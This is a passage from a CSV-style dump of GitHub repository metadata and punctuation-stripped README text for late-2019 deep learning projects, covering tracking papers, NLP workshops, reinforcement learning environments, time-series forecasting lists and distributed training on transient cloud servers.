contentCVPR2019 papers FanSiameseCascadedRegionProposalNetworksforReal TimeVisualTrackingCVPR2019paper pdf 35 J Gao T Zhang and C Xu Graph convolutional tracking in Proc CVPR 2019 pp 46494659 GCT http openaccess thecvf com contentCVPR2019 papers GaoGraphConvolutionalTrackingCVPR2019paper pdf 36 Q Wang L Zhang L Bertinetto W Hu and P H S Torr Fast online object tracking and segmentation A unifying approach in Proc IEEE CVPR 2019 SiamMask http openaccess thecvf com contentCVPR2019 papers WangFastOnlineObje,2019-11-23T12:48:02Z,2019-12-13T01:21:57Z,n/a,MMarvasti,User,2,8,2,232,master,MMarvasti,1,0,0,0,0,0,0
AMDonati,ODSC2019-DL-models-NLP,n/a,ODSC2019 DL models NLP materials for my workshop Latest Deep Learning Models for NLP https odsc com training portfolio latest deep learning models for natural language processing the European Open Data Science Conference 2019 London https odsc com training portfolio latest deep learning models for natural language processing Slides The slides are available here https docs google com presentation d 1Gmsi1V1luN77l25ftnjgL3h60HpEo4zSapJYAcM6I M edit usp sharing Practical tutorials colab notebook for tutorial 1 https colab research google com drive 1ZlMNPGGNmXtKwh3D4XPQCYIeR3Wkmh colab notebook for tutorial 2 https colab research google com github tensorflow docs blob master site en tutorials text transformer ipynb Resources used to prepare the workshop https thegradient pub nlp imagenet https ruder io deep learning nlp best practices https ruder io a review of the recent history of nlp https ruder io 4 biggest open problems in nlp https ruder io state of transfer learning in nlp https rlss inria fr files 2019 07 languagestrub pdf additional resources https github com keon awesome nlp https web stanford edu jurafsky slp3 https dawn cs stanford edu 2019 03 22 glue https drive google com file d 15ehMIJ7wY9A7RSmyJPNmrBMuC7se0PMP view,2019-11-14T09:31:48Z,2019-12-03T14:04:27Z,Jupyter Notebook,AMDonati,User,2,8,7,9,master,AMDonati,1,0,0,0,0,0,0
nslatysheva,ODSC_Sequence_Modelling,n/a,Sequence Modelling with Deep Learning This is the code and files for the practical tutorial for this ODSC tutorial Setting up This tutorial uses some scientific Python libraries numpy pandas and the Keras API on top of a Tensorflow back end The exact version requirements are contained in the requirements txt file You can install the right environment in a virtualenv using these commands bash virtualenv tutorialenv source tutorialenv bin activate activate environment pip3 install r requirements txt install requirements jupyter notebook launch notebook A more fiddly but general solution in case you re having some issues e g not the right version of Python or notebook is not using new kernel bash virtualenv python usr local bin python3 tutorialenv source tutorialenv bin activate pip3 install ipykernel python3 m ipykernel install user name tutorialenv display name tutorialenvkernel Tutorial Abstract Much of data is sequential think speech text DNA stock prices financial transactions and customer action histories Modern methods for modelling sequence data are often deep learning based composed of either recurrent neural networks RNNs or attention based Transformers A tremendous amount of research progress has recently been made in sequence modelling particularly in the application to NLP problems However the inner workings of these sequence models can be difficult to dissect and intuitively understand This presentation tutorial will start from the basics and gradually build upon concepts in order to impart an understanding of the inner mechanics of sequence models why do we need specific architectures for sequences at all when you could use standard feed forward networks How do RNNs actually handle sequential information and why do LSTM units help longer term remembering of information How can Transformers do such a good job at modelling sequences without any recurrence or convolutions In the practical portion of this tutorial attendees will learn how to build their own LSTM based language model in Keras A few other use cases of deep learning based sequence modelling will be discussed including sentiment analysis prediction of the emotional valence of a piece of text and machine translation automatic translation between different languages The goals of this presentation are to provide an overview of popular sequence based problems impart an intuition for how the most commonly used sequence models work under the hood and show that quite similar architectures are used to solve sequence based problems across many domains,2019-11-03T22:59:55Z,2019-11-25T09:01:44Z,Jupyter Notebook,nslatysheva,User,2,8,4,10,master,nlatysheva,1,0,0,1,0,0,0
nathangrinsztajn,Box-World,n/a,Box World Introduction Gym implementation of the Box World environment from the paper Relational Deep Reinforcement Learning https arxiv org pdf 1806 01830 pdf which is made to explicitly target relational reasoning Example Game 1 Example Game 2 Example Game 3 Game 1 examples round1 gif raw true Game 2 examples round2 gif raw true Game 3 examples round0 gif raw true It is a perceptually simple but combinatorially complex environment that requires abstract relational reasoning and planning It consists of a n n pixel room with keys and boxes randomly scattered The room also contains an agent represented by a single dark gray pixel which can move in four directions up down left right Keys are represented by a single colored pixel The agent can pick up a loose key i e one not adjacent to any other colored pixel by walking over it Boxes are represented by two adjacent colored pixels the pixel on the right represents the boxs lock and its color indicates which key can be used to open that lock the pixel on the left indicates the content of the box which is inaccessible while the box is locked To collect the content of a box the agent must first collect the key that opens the box the one that matches the locks color and walk over the lock which makes the lock disappear At this point the content of the box becomes accessible and can be picked up by the agent Most boxes contain keys that if made accessible can be used to open other boxes One of the boxes contains a gem represented by a single white pixel The goal of the agent is to collect the gem by unlocking the box that contains it and picking it up by walking over it The key that an agent has in possession is depicted in the input observation as a pixel in the top left corner In each level there is a unique sequence of boxes that need to be opened to reach the gem Opening one wrong box a distractor box leads to a dead end where the gem cannot be reached and the level becomes unsolvable Three user controlled parameters contribute to the difficulty of the level The number of boxes in the path to the goal solution length The number of distractor branches The length of the distractor branches In general the task is computationally difficult for a few reasons First a key can only be used once so the agent must be able to reason about whether a particular box is along a distractor branch or the solution path Second keys and boxes appear in random locations in the room emphasizing a capacity to reason about keys and boxes based on their abstract relations rather than based on their spatial positions Actions The game provides 4 actions to interact with the environment The mapping of the action numbers to the actual actions looks as follows Action ID Move Up 0 Move Down 1 Move Left 2 Move Right 3 Quick Game bash python HumanplayingCommandline py gifs,2019-11-05T13:08:52Z,2019-12-10T01:37:40Z,Python,nathangrinsztajn,User,1,8,2,15,master,nathangrinsztajn,1,0,0,0,0,0,0
agadetsky,pytorch-pl-variance-reduction,aaai2020#control-variates#directed-acyclic-graph#neurips-2019#permutations#plackett-luce#plackett-luce-distribution#pytorch#rebar#relax#structure-learning#variance-reduction,Low variance Black box Gradient Estimates for the Plackett Luce Distribution This repo contains code for our paper Low variance Black box Gradient Estimates for the Plackett Luce Distribution https arxiv org abs 1911 10036 Abstract Learning models with discrete latent variables using stochastic gradient descent remains a challenge due to the high variance of gradients Modern variance reduction techniques mostly consider categorical distributions and have limited applicability when the number of possible outcomes becomes large In this work we consider models with latent permutations and propose control variates for the Plackett Luce distribution In particular the control variates allow us to optimize black box functions over permutations using stochastic gradient descent To illustrate the approach we consider a variety of causal structure learning tasks for continuous and discrete data We show that for differentiable functions our method outperforms competitive relaxation based optimization methods and is also applicable to non differentiable score functions Citation Coming soon Toy Experiment Prepare environment maybe you ll need to change cudatoolkit version in toyenv yml or even use cpuonly version of PyTorch conda env create f toyenv yml conda activate toyenv Run toyexperiment py python toyexperiment py estimator exact python toyexperiment py estimator reinforce python toyexperiment py estimator rebar python toyexperiment py estimator relax Plot figure using plottoy ipynb alt text figures toytogether png Results were obtained using cpu Quantitative results for cuda may vary slighlty due to randomness in cuda kernels but qualitative results remain the same,2019-11-21T10:48:34Z,2019-12-12T13:10:33Z,Jupyter Notebook,agadetsky,User,2,8,0,10,master,agadetsky,1,0,0,0,0,0,0
facebookresearch,hanabi_SAD,n/a,Simplified Action Decoder in Hanabi This repo contains code and models for Simplified Action Decoder for Deep Multi Agent Reinforcement Learning https arxiv org abs 1912 02288 To reference this work please use mischu2019simplified title Simplified Action Decoder for Deep Multi Agent Reinforcement Learning author Hengyuan Hu and Jakob N Foerster year 2019 eprint 1912 02288 archivePrefix arXiv primaryClass cs AI Compile Prerequisite Install cudnn7 cuda9 2 and gcc7 This might be platform dependent Other versions might also work but we have only tested with the above versions Note that we discovered a deadlock problem when using tensors with C multi threading when using cuda10 0 on Pascal GPU Build PyTorch from Source Create a fresh conda env compile PyTorch from source If PyTorch and this repo are compiled by compilers with different ABI compatibility mysterious bugs that unexpectedly corrupt memory may occur To avoid that the current solution is to compile install PyTorch from source first and then compile this repo against that PyTorch binary For convenience we paste instructions of compling PyTorch here bash create a fresh conda environment with python3 conda create name your env name python 3 7 conda activate your env name conda install numpy pyyaml mkl mkl include setuptools cmake cffi typing conda install c pytorch magma cuda92 clone pytorch git clone b v1 3 0 recursive https github com pytorch pytorch cd pytorch export CMAKEPREFIXPATH CONDAPREFIX dirname which conda set cuda arch list so that the built binary can be run on both pascal and volta TORCHCUDAARCHLIST 6 07 0 python setup py install Additional dependencies bash pip install tensorboardX pip install psutil if the current cmake version is 3 15 conda install c conda forge cmake Clone Build this repo For convenience add the following lines to your bashrc after the line of conda activate xxx bash set path CONDAPREFIX CONDAPREFIX dirname which conda export CPATH CONDAPREFIX include CPATH export LIBRARYPATH CONDAPREFIX lib LIBRARYPATH export LDLIBRARYPATH CONDAPREFIX lib LDLIBRARYPATH avoid tensor operation using all cpu cores export OMPNUMTHREADS 1 Clone build bash git clone recursive https github com facebookresearch hanabi git cd hanabi mkdir build cd build cmake make j10 Run hanabi pyhanabi tools contains some example scripts to launch training runs dev sh requires 2 gpus to run 1 for training 1 for simulation while the rest require 3 gpus 1 for training 2 for simulation bash cd pyhanabi sh tools dev sh Trained Models Run the following command to download the trained models used to produce tables in the paper bash cd model sh download sh To evaluate a model simply run bash cd pyhanabi python tools evalmodel py weight models sad2p10 pthw numplayer 2 Related Repos The results on Hanabi can be further improved by running search on top of our agents Please refer to the paper https arxiv org abs 1912 02318 and code https github com facebookresearch HanabiSPARTA for details We also open sourced a single agent implementation of R2D2 tested on Atari here https github com facebookresearch rela Contribute Python Use black https github com psf black to format python code run black py before pushing C The root contains a clang format file that define the coding style of this repo run the following command before submitting PR or push bash clang format i h clang format i cc Copyright Copyright c Facebook Inc and its affiliates All rights reserved This source code is licensed under the license found in the LICENSE file in the root directory of this source tree,2019-11-26T23:58:31Z,2019-12-14T12:46:09Z,C++,facebookresearch,Organization,5,7,4,2,master,hengyuan-hu,1,0,0,1,0,0,0
juliusberner,oberwolfach_workshop,approximation#deep-learning#learning-theory#mathematics#neural-network,Banach Center Oberwolfach Graduate Seminar Mathematics of Deep Learning Teaching material for Mathematics of Deep Learning Workshop https www mfo de occasion 1947a Overview Monday Tuesday Wednesday Thursday Friday Mathematical Foundations of ML slides Grohs BedlewoMathematicalLearning pdf Approximation Theory and Expressivity I slides Kutyniok TalkBanachCenter22019 pdf Approximation Theory slides Grohs BedlewoApproximationTheory pdf Deep Neural Networks for PDEs slides Grohs BedlewoPDEs pdf Interpretability slides Kutyniok TalkBanachCenter52019 pdf Introduction to Neural Networks slides Kutyniok TalkBanachCenter12019 pdf Neural Network Approximation in TensorFlow https colab research google com drive 1gHoRg 5szIlmsSLTe143SFpxI81iYCK Deep Learning meets Inverse Problems slides Kutyniok TalkBanachCenter32019 pdf Deep Learning meets Parametric Partial Differential Equation slides Kutyniok TalkBanachCenter42019 pdf Generalization for Deep Learning slides Grohs BedlewoGeneralization pdf Introduction to TensorFlow https colab research google com drive 1UxClfRrD rBIuT23b2O Dhoo67304ZVM Deep Learning for Kolmogorov PDEs https colab research google com drive 19KPlzVjRmLsu7EKPScSU7wcnh OOA2p NN Training in the Overparametrized Setting slides Berner overparametrizedtraining pdf Linear Regression with LASSO https colab research google com drive 1vbGkDkgmrBQp9WiEVPvQIERZ2pMcl4V Talks 1 Gitta Kutyniok Introduction to Neural Networks https github com juliusberner oberwolfachworkshop raw master slides Kutyniok TalkBanachCenter12019 pdf Approximation Theory and Expressivity I https github com juliusberner oberwolfachworkshop raw master slides Kutyniok TalkBanachCenter22019 pdf Deep Learning meets Inverse Problems https github com juliusberner oberwolfachworkshop raw master slides Kutyniok TalkBanachCenter32019 pdf Deep Learning meets Parametric Partial Differential Equation https github com juliusberner oberwolfachworkshop raw master slides Kutyniok TalkBanachCenter42019 pdf Interpretability https github com juliusberner oberwolfachworkshop raw master slides Kutyniok TalkBanachCenter52019 pdf 2 Philipp Grohs Mathematical Foundations of ML https github com juliusberner oberwolfachworkshop raw master slides Grohs BedlewoMathematicalLearning pdf Approximation Theory https github com juliusberner oberwolfachworkshop raw master slides Grohs BedlewoApproximationTheory pdf Deep Neural Networks for PDEs https github com juliusberner oberwolfachworkshop raw master slides Grohs BedlewoPDEs pdf Generalization for Deep Learning https github com juliusberner oberwolfachworkshop raw master slides Grohs BedlewoGeneralization pdf 3 Julius Berner NN Training in the Overparametrized Setting https github com juliusberner oberwolfachworkshop raw master slides Berner overparametrizedtraining pdf Notebooks Google Colaboratory 1 Philipp Grohs Linear Regression with LASSO LinearRegressionwithLASSO https colab research google com drive 1vbGkDkgmrBQp9WiEVPvQIERZ2pMcl4V 2 Julius Berner A simple approach to the Fashion MNIST dataset FashionMNIST https colab research google com drive 1UxClfRrD rBIuT23b2O Dhoo67304ZVM Framework for constructing deep neural networks to efficiently approximate various functions NNApproximation https colab research google com drive 1gHoRg 5szIlmsSLTe143SFpxI81iYCK Deep learning based method for solving high dimensional Kolmogorov PDEs DLKolmogorov https colab research google com drive 19KPlzVjRmLsu7EKPScSU7wcnh OOA2p Local Environment 1 Install the Python development environment 2 Create a virtual environment 3 Install requirements txt see https www tensorflow org install pip,2019-11-02T15:41:57Z,2019-12-14T17:35:40Z,Jupyter Notebook,juliusberner,User,3,7,3,30,master,juliusberner,1,0,0,0,0,0,0
cake-lab,transient-deep-learning,n/a,Speeding up Deep Learning with Transient Servers About This repo is for the paper Speeding up Deep Learning with Transient Servers https arxiv org abs 1903 00045 presented at ICAC 2019 The paper was also covered by a Google for Education case study blog https edu google com why google case studies wpi gcp modalactive none The paper explores the opportunity of conducting distributed training of deep neural networks with transient cloud resources especially the GPU servers The transient resources are cheaper than on demand ones but with the caveat of being revoked by the cloud provider at any given time By using transient cloud servers we achieved the potential of up to 62 9 monetary savings and consequently 7 7X speed up due to the spare budget to deploy more servers in training We also identified several opportunities for both cloud infrastructure and deep learning frameworks to provide better support for transient distributed training The repo contains code found in the code folder to reproduce the experiments mentioned in the paper The code will request cloud resources that the user specifies propagate training scripts and set up distributed training jobs on the servers The repo also provides the experiment data shown in the paper located in the data folder For details on the data please see the readme inside the data folder Highlight Our data driven approach shows that by using transient cloud servers we can achieve the potential of up to 62 9 monetary savings and 7 7X speed up compared to a single server baseline By launching large scale transient cloud servers we are able to gather data on the impact transient revocation has on training performance in terms of training time cost and converged accuracy and trained models We demonstrate several benefits and limitations of using heterogeneous servers in distributed training In particular our findings suggest a number of plausible transient aware designs for deep learning frameworks including the ability to train with dynamic cluster sizes to better exploit these cheap transient servers Fig 1 Training performance and cost of using cluster with 4 transient K80 GPU servers Fig 2 Training performance and cost of using cluster with 8 transient K80 GPU servers Fig 3 Training cost of using different configurations of heterogeneous clusters with 4 GPU servers How to use the code Dependency and cloud image The code used custom cloud images for both GPU and CPU servers and the images are currently not public Thus in order to run it you need to create two custom images first We ran the code on cloud servers with Ubuntu 18 04 LTS 4 8 vCPU cores and 24 51 GB memory with 100 GB disk space Ubuntu 16 04 LTS might work but with some unexpected behavior First create a VM and ssh into it Then update apt get and install the dependencies bash sudo apt get update sudo apt get install y openjdk 8 jdk git python dev python3 dev python numpy python3 numpy build essential python pip python3 pip python virtualenv swig python wheel libcurl3 dev curl g freeglut3 dev libx11 dev libxmu dev libxi dev libglu1 mesa libglu1 mesa dev parallel Install nvidia drivers the code is based on CUDA 9 0 Notice all the CUDA and CUDNN related dependencies are not required for the CPU image bash Install NVIDIA driver sudo apt install nvidia 384 nvidia 384 dev CUDA 9 0 requires gcc 6 0 sudo apt install gcc 6 sudo apt install g 6 Get CUDA 9 0 files and install wget https developer nvidia com compute cuda 9 0 Prod localinstallers cuda9 0 176384 81linux run chmod x cuda9 0 176384 81linux run sudo cuda9 0 176384 81linux run override After rebooting the VM check if CUDA is installed properly bash sudo reboot nvidia smi An operational GPU would return something like NVIDIA SMI 396 26 Driver Version 396 26 GPU Name Persistence M Bus Id Disp A Volatile Uncorr ECC Fan Temp Perf Pwr Usage Cap Memory Usage GPU Util Compute M 0 Tesla K80 Off 00000000 00 04 0 Off 0 N A 35C P8 27W 149W 15MiB 11441MiB 0 Default Processes GPU Memory GPU PID Type Process name Usage 0 1658 G usr lib xorg Xorg 14MiB Install CUDNN 7 5 you need to go to the Nvidia website and register then download the tar file and install it Edit cuda path to bashrc and reload it bash echo export PATH usr local cuda 9 0 bin PATH bashrc echo export LDLIBRARYPATH usr local cuda 9 0 lib64 LDLIBRARYPATH bashrc source bashrc Don t forget to move CUDNN to the CUDA folder sudo cp P cuda include cudnn h usr local cuda 9 0 include sudo cp P cuda lib64 libcudnn usr local cuda 9 0 lib64 sudo chmod a r usr local cuda 9 0 lib64 libcudnn The last step would be to install TensorFlow 1 10 and modified Tensor2Tensor Tensor2Tensor can be found in the code folder bash sudo pip install tensorflow gpu 1 10 for cpu servers install tensorflow 1 10 instead pip install e code tensor2tensor After the dependency installation make two images one for workers and one for parameter servers Example command as below to create the instance gpu and instance cpu images that we used in the code bash gcloud compute instances set disk auto delete instance gpu disk instance gpu no auto delete gcloud compute instances set disk auto delete instance cpu disk instance cpu no auto delete gcloud compute images create gpu ubuntu18 source disk instance gpu gcloud compute images create cpu ubuntu18 source disk instance cpu Running the code The code supports training models implemented in the Tensor2Tensor library For the paper we mainly used ResNet models The code currently supports Google Compute Engine To run the code simply input the following command It will set up a cluster with 1 parameter server and 4 workers equipped with K80 GPU and train the CIFAR 10 dataset on ResNet 32 for 64k steps The trained model will be generated in the specified cloud bucket bash python main py proj name YOURPROJNAME cred path YOURGCECREDENTIALPATH job name res32 num ps 1 ps core num 4 num worker 4 num shard 1 bucket dir gs YOURBUCKET model resnet hparam set resnetcifar32 problem imagecifar10 train steps 64000 ckpt frequency 100000 automation test 0 setSlot 1 maxWorker 8 zone us west1 b gpu k80 hetero 0 Explanations of the other parameters can be found below they are experimental and not the core focus of the paper ps core num determines the number of vCPU cores for parameter servers num shard how many shards to partition the parameter set ckpt frequency how frequent to checkpoint during training automation test only used in combination with a monitor currently not supported setSlot part of test for dynamic learning rate maxWorker part of test for dynamic learning rate Alternatively if you want to test out heterogeneous cluster config for example 4 workers and 1 parameter parameter server in us west1 b 2 K80 GPU servers in us west1 b 1 P100 server in us central1 a and 1 V100 server in us east1 a you can use the following command bash python main py proj name YOURPROJNAME cred path YOURGCECREDENTIALPATH job name res32 num ps 1 ps core num 4 num worker 4 num shard 1 bucket dir gs YOURBUCKET model resnet hparam set resnetcifar32 problem imagecifar10 train steps 64000 ckpt frequency 100000 automation test 0 setSlot 1 maxWorker 8 hetero 1 gpuarray k80 k80 p100 v100 zonearray us west1 b us west1 b us west1 b us central1 a us east1 b Citation If you would like to cite the paper please cite it as bib inproceedings2019icac speedup author Li Shijian and Walls Robert J and Xu Lijie and Guo Tian title Speeding up Deep Learning with Transient Servers booktitle Proceedings of the 16th IEEE International Conference on Autonomic Computing ICAC 19 year 2019 Acknowledgement This work is supported in part by National Science Foundation grants 1755659 and 1815619 Google Cloud Platform Research credits the National Natural Science Foundation of China 61802377 and the Youth Innovation Promotion Association at CAS Contact More project information can be found in our lab s project site https cake lab github io projects Shijian Li sli8 wpi edu sli8 wpi edu Robert Walls rjwalls wpi edu rjwalls wpi edu Tian Guo tian wpi edu tian wpi edu,2019-12-10T05:27:50Z,2019-12-12T19:03:53Z,Python,cake-lab,Organization,1,6,0,2,master,lawdpls,1,0,0,0,0,0,0
AzePUG,Deep_Learning_Video_Materials,n/a,DeepLearningVideoMaterials Bu repo da AzePUG adndan kdiyimiz ML Deep Learning video drslr n kod nmunlri v digr lav materiallar payalacaq,2019-11-10T18:29:48Z,2019-11-24T22:30:49Z,Jupyter Notebook,AzePUG,Organization,1,6,1,10,master,ShahriyarR,1,0,0,0,0,0,0
wwdguu,Awesome-Deep-Learning-Based-Time-Series-Forecasting,n/a,Awesome Deep Learning Based Time Series Forecasting Time Series Forecasting Papers arxiv papers 2019 DSTP RNN DSTP RNN a dual stage two phase attention based recurrent neural networks for long term and multivariate time series prediction paper https arxiv org abs 1904 07464 code https github com arleigh418 Paper Implementation DSTP RNN For Stock Prediction Based On DA RNN TPA LSTM Temporal Pattern Attention for Multivariate Time Series Forecasting paper https arxiv org abs 1809 04206 code https github com gantheory TPA LSTM Foundations of sequence to sequence modeling for time series paper https arxiv org pdf 1805 03714 pdf 2018 MTNet A Memory Network Based Solution for Multivariate Time Series Forecasting paper https arxiv org abs 1809 02105 code https github com Maple728 MTNet HRHN Hierarchical Attention Based Recurrent Highway Networks for Time Series Prediction paper https arxiv org abs 1806 00685 code https github com KurochkinAlexey Hierarchical Attention Based Recurrent Highway Networks for Time Series Prediction Conditional Time Series Forecasting with Convolutional Neural Networks paper https arxiv org abs 1703 04691 A Multi Horizon Quantile Recurrent Forecaster paper https arxiv org pdf 1711 11053 pdf EA LSTM Evolutionary Attention based LSTM for Time Series Prediction paper https arxiv org pdf 1811 03760 pdf 2017 DeepAR Probabilistic forecasting with autoregressive recurrent networks paper https arxiv org abs 1704 04110 code https github com arrigonialberto86 deepar NeurIPS 2019 DILATE Shape and Time Distorsion Loss for Training Deep Time Series Forecasting Models paper https arxiv org abs 1909 09020 code https github com vincent leguen DILATE Think Globally Act Locally A Deep Neural Network Approach to High Dimensional Time Series Forecasting paper https arxiv org abs 1905 03806 High Dimensional Multivariate Forecasting with Low Rank Gaussian Copula Processes paper https arxiv org abs 1910 03002 Enhancing the Locality and Breaking the Memory Bottleneck of Transformer on Time Series Forecasting paper https arxiv org abs 1907 00235 2018 Deep State Space Models for Time Series Forecasting paper https papers nips cc paper 8004 deep state space models for time series forecasting pdf 2017 ICML 2019 Deep Factors for Forecasting paper https arxiv org pdf 1905 12417 pdf 2018 Autoregressive Convolutional Neural Networks for Asynchronous Time Series paper https arxiv org pdf 1703 04122 pdf Hierarchical Deep Generative Models for Multi Rate Multivariate Time Series paper http proceedings mlr press v80 che18a che18a pdf SIGIR 2018 LSTNet Modeling Long and Short Term Temporal Patterns with Deep Neural Networks paper https arxiv org abs 1703 07015 code https github com laiguokun LSTNet A Flexible Forecasting Framework for Hierarchical Time Series with Seasonal Patterns A Case Study of Web Traffic paper http people cs pitt edu milos research 2018 SIGIR18LiuHierarchicalSeasonalTS pdf SIGKDD 2019 Multi Horizon Time Series Forecasting with Temporal Attention Learning paper https www kdd org kdd2019 accepted papers view multi horizon time series forecasting with temporal attention learning AAAI 2019 Cogra Concept Drift Aware Stochastic Gradient Descent for Time Series Forecasting paper https www aaai org ojs index php AAAI article view 4383 2015 IJCAI 2019 Learning Interpretable Deep State Space Model for Probabilistic Time Series Forecasting paper https www ijcai org proceedings 2019 402 Deep State Space Models for Time Series Forecasting paper https papers nips cc paper 8004 deep state space models for time series forecasting pdf Explainable Deep Neural Networks for Multivariate Time Series Predictions paper https www ijcai org proceedings 2019 0932 pdf 2018 GeoMAN GeoMAN Multi level Attention Networks for Geo sensory Time Series Prediction paper https www ijcai org proceedings 2018 0476 pdf code https github com xchadesi GeoMAN 2017 DA RNN A Dual Stage Attention Based Recurrent Neural Network for Time Series Prediction paper https www ijcai org proceedings 2017 0366 pdf code https github com Zhenye Na DA RNN CIKM 2019 DSANet Dual Self Attention Network for Multivariate Time Series Forecasting paper https kyonhuang top files Huang DSANet pdf code https github com bighuang624 DSANet Time Series Prediction with Interpretable Data Reconstruction paper http www cikm2019 net attachments papers p2133 tianA pdf Others Attention based recurrent neural networks for accurate short term and long term dissolved oxygen prediction paper https www sciencedirect com science article pii S0168169919312499 Stock Price Prediction Using Attention based Multi Input LSTM paper http proceedings mlr press v95 li18c li18c pdf Co evolutionary multi task learning with predictive recurrence for multi step chaotic time series prediction paper https www researchgate net publication 314202188Co evolutionarymulti tasklearningwithpredictiverecurrenceformulti stepchaotictimeseriesprediction A New Timing Error Cost Function for Binary Time Series Prediction paper https www researchgate net publication 331033415ANewTimingErrorCostFunctionforBinaryTimeSeriesPrediction A bias and variance analysis for multistep ahead time series forecasting paper https www researchgate net publication 274091015ABiasandVarianceAnalysisforMultistep AheadTimeSeriesForecasting Spatial Temporal Time Series Forecasting Papers arxiv Deep forecast Deep learning based spatio temporal forecasting paper https arxiv org pdf 1707 08110 pdf AAAI 2019 ASTGCN Attention Based Spatial Temporal Graph Convolutional Networks for Traffic Flow Forecasting paper https www aaai org ojs index php AAAI article view 3881 code mxnet https github com Davidham3 ASTGCN Deep Hierarchical Graph Convolution for Election Prediction from Geospatial Census Data paper https aaai org ojs index php AAAI article view 3841 Dynamic Spatial Temporal Graph Convolutional Neural Networks for Traffic Forecasting paper https aaai org ojs index php AAAI article view 3877 Revisiting Spatial Temporal Similarity A Deep Learning Framework for Traffic Prediction paper https arxiv org pdf 1803 01254 pdf Spatiotemporal Multi Graph Convolution Network for Ride Hailing Demand Forecasting paper http www scf usc edu yaguang papers aaai19multigraphconvolution pdf 2018 Deep Multi View Spatial Temporal Network for Taxi Demand Prediction paper https www aaai org ocs index php AAAI AAAI18 paper viewFile 16069 15978 DeepUrbanMomentum An Online Deep Learning System for Short Term Urban Mobility Prediction paper https aaai org ocs index php AAAI AAAI18 paper view 16499 15759 IJCAI 2019 GSTNet Global Spatial Temporal Network for Traffic Flow Prediction paper https www ijcai org proceedings 2019 317 2018 Spatio Temporal Graph Convolutional Networks A Deep Learning Framework for Traffic Forecasting paper https www ijcai org proceedings 2018 0505 pdf code pytorch https github com FelixOpolka STGCN PyTorch Weather Forecasting Papers arxiv SIGKDD 2019 Deep Uncertainty Quantification A Machine Learning Approach for Weather Forecasting paper https arxiv org pdf 1805 03714 pdf code https github com BruceBinBoxing DeepLearningWeatherForecasting,2019-11-05T12:21:46Z,2019-12-08T12:05:30Z,n/a,wwdguu,User,1,6,1,25,master,wwdguu,1,0,0,0,0,0,0
Long-Kai,GradAttnHash,hashing,Gradient Attention Hashing This is the source code for paper Accelerate Learning of Deep Hashing With Gradient Attention ICCV 2019 The code is implemented on PyTorch Version 0 4 1 Citation If you use this code for your research please consider cite the paper inproceedingshuang2019accelerate title Accelerate Learning of Deep Hashing With Gradient Attention author Huang Long Kai and Chen Jianda and Pan Sinno Jialin booktitle Proceedings of the IEEE International Conference on Computer Vision pages 5271 5280 year 2019 Datasets The datasets used in experiments are CIFAR 10 ImageNet and NUSWIDE 81 To run the code it needs to download the images of these datasets and decompress them into corresponding folds in data data Training Run runtraining py runtraining py to start training The training parameters can be configured in runtraining py runtraining py To save the model for evaluation change trconfig savemodel False to True,2019-11-05T06:56:38Z,2019-11-25T14:11:09Z,Python,Long-Kai,User,2,6,0,11,master,Long-Kai,1,0,0,1,0,0,0
willzli,dl_frame_toy,n/a,Deep Learning Framework Toy Demonstrate the core working principles of the deep learning framework autodiffengine py334 autodiffengine py has 334 lines of code after removing comments and blank lines python2 7python3 6 Compatible with python2 7 and python3 6 Usage python logisticregressiondemo py Epoch 0 Learning rate 0 01 Loss 426 714349 Epoch 1000 Learning rate 0 01 Loss 0 897318 Epoch 2000 Learning rate 0 01 Loss 0 476535 Epoch 3000 Learning rate 0 01 Loss 0 324764 Epoch 4000 Learning rate 0 01 Loss 0 246470 Epoch 5000 Learning rate 0 01 Loss 0 198672 Epoch 97000 Learning rate 0 01 Loss 0 010806 Epoch 98000 Learning rate 0 01 Loss 0 010698 Epoch 99000 Learning rate 0 01 Loss 0 010591,2019-11-19T04:27:55Z,2019-11-26T07:11:15Z,Python,willzli,User,1,6,0,6,master,willzli,1,0,0,0,0,0,0
vickipedia6,Tennis-Deep-Reinforcement-Learning,n/a,Tennis Deep Reinforcement Learning In this environment two agents control rackets to bounce a ball over a net If an agent hits the ball over the net it receives a reward of 0 1 If an agent lets a ball hit the ground or hits the ball out of bounds it receives a reward of 0 01 Thus the goal of each agent is to keep the ball in play The observation space consists of 8 variables corresponding to the position and velocity of the ball and racket Each agent receives its own local observation Two continuous actions are available corresponding to movement toward or away from the net and jumping The task is episodic and in order to solve the environment your agents must get an average score of 0 5 over 100 consecutive episodes after taking the maximum over both agents Specifically After each episode we add up the rewards that each agent received without discounting to get a score for each agent This yields 2 potentially different scores We then take the maximum of these 2 scores This yields a single score for each episode Solution The environment is considered solved when the average over 100 episodes of those scores is at least 0 5 Getting Started Download the Unity Environment For this project you will not need to install Unity this is because we have already built the environment for you and you can download it from one of the links below You need only select the environment that matches your operating system Linux click here https s3 us west 1 amazonaws com udacity drlnd P3 Tennis TennisLinux zip Mac OSX click here https s3 us west 1 amazonaws com udacity drlnd P3 Tennis Tennis app zip Windows 32 bit click here https s3 us west 1 amazonaws com udacity drlnd P3 Tennis TennisWindowsx86 zip Windows 64 bit click here https s3 us west 1 amazonaws com udacity drlnd P3 Tennis TennisWindowsx8664 zip Then place the file in the folder in the Tennis Deep Reinforcement Learning GitHub repository and unzip or decompress the file Output Instructions 1 Download the project materials from my GitHub repository You can download the repository with git clone https github com vickipedia6 Tennis Deep Reinforcement Learning git 2 Download anaconda or miniconda based on the instructions in the Anaconda documentation https docs anaconda com 3 Create a new conda environment conda create name deep learning python 3 4 Enter your new environment Mac Linux source activate deep learning Windows activate deep learning 5 Ensure you have numpy matplotlib pandas and jupyter notebook installed by doing the following conda install numpy matplotlib pandas jupyter notebook 6 Run the following to open up the notebook server jupyter notebook Tennis ipynb 7 Execute all the cells in the code Project results The agent achieved the average score of 0 7 in less than 2000 episodes Built With Python 3 License This project is licensed under the MIT License see the LICENSE md LICENSE md file for details Acknowledgments The data comes from the Udacity,2019-12-01T14:43:00Z,2019-12-06T04:22:03Z,Jupyter Notebook,vickipedia6,User,1,5,1,5,master,vickipedia6,1,0,0,0,0,0,0
adnortje,deepvideo,deep-learning#pytorch#video-compression#video-prediction,Deep Video Compression Deep motion estimation for parallel inter frame prediction in video compression Please note This code is currently in a very rough state i e it would be hard to use out of the box I ll update and make it more usable in the near future,2019-11-22T10:55:21Z,2019-12-13T15:21:52Z,Jupyter Notebook,adnortje,User,5,5,1,2,master,adnortje,1,0,0,0,0,0,0
